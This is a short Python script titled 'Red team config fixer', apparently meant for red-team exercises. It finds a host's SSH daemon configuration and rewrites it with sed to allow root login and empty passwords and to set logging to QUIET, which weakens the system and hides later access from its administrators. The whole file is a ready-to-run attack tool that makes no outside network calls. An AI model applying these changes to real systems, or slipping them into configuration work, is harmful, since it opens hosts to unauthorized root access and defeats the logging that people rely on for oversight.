#Red team config fixer
import os

#filechecks
sshTrue = os.path.isfile("/etc/ssh/sshd_config")


#ssh
if sshTrue is True:
    print "Softening SSH"
    os.system("sed -i 's/.PermitRootLogin.*$/PermitRootLogin yes/g' /etc/ssh/sshd_config")
    os.system("sed -i 's/PermitRootLogin.*$/PermitRootLogin yes/g' /etc/ssh/sshd_config")

    os.system("sed -i 's/.PermitEmptyPasswords.*$/PermitEmptyPasswords yes/g' /etc/ssh/sshd_config")
    os.system("sed -i 's/PermitEmptyPasswords.*$/PermitEmptyPasswords yes/g' /etc/ssh/sshd_config")

    os.system("sed -i 's/RSAAuthentication.*$/RSAAuthentication yes/g' /etc/ssh/sshd_config")

    os.system("sed -i 's/.PubkeyAuthentication.*$/PubkeyAuthentication yes/g' /etc/ssh/sshd_config")
    os.system("sed -i 's/PubkeyAuthentication.*$/PubkeyAuthentication yes/g' /etc/ssh/sshd_config")

    os.system("sed -i 's/.UsePAM.*$/UsePAM yes/g' /etc/ssh/sshd_config")
    os.system("sed -i 's/UsePAM.*$/UsePAM yes/g' /etc/ssh/sshd_config")

    os.system("sed -i 's/.LogLevel.*$/LogLevel QUIET/g' /etc/ssh/sshd_config")
    os.system("sed -i 's/LogLevel.*$/LogLevel QUIET/g' /etc/ssh/sshd_config")


else:
    print "No SSH config found"
